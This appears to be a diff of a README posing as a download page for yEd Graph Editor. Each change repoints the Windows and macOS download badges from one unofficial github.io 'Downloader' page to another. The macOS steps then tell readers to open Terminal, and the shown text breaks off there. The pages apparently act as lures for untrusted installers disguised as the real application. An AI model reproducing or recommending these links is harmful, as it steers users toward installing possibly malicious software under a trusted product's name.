@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_yEd%20Graph%20Editor-0078D4?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download](https://img.shields.io/badge/⬇_Download_yEd%20Graph%20Editor-0078D4?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
 
 </div>
 
@@ -65,9 +65,9 @@ yEd Graph Editor is a powerful desktop application for creating diagrams and gra
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://hydracomptrollercord.github.io/Downloader/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beauticianblaze.github.io/DownloadMac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hydracomptrollercord.github.io/MacDownloader/)
 
 </div>
 
@@ -80,7 +80,7 @@ yEd Graph Editor is a powerful desktop application for creating diagrams and gra
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_yEd%20Graph%20Editor-0078D4?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download](https://img.shields.io/badge/⬇_Download_yEd%20Graph%20Editor-0078D4?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
 
 </div>
 
@@ -110,7 +110,7 @@ yEd Graph Editor is a powerful desktop application for creating diagrams and gra
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beauticianblaze.github.io/DownloadMac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hydracomptrollercord.github.io/MacDownloader/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
